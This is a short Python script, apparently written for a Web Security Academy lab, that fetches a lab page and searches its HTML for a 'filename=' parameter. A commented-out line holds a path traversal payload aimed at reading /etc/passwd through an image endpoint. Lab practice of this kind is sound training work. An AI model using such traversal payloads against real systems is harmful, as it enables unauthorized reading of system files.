import re
import requests

#payload = "../../../etc/passwd"
#url = "https://acc61f2c1e641833c021430100060072.web-security-academy.net/image?filename=" + payload

url = "https://acae1f8a1eac1389c08a645f005b004e.web-security-academy.net/"

patern = "filename="

response = requests.get(url)

print(response.text)

search = re.search(patern, response.text)

print (search.group(0))

#response = print(requests.content)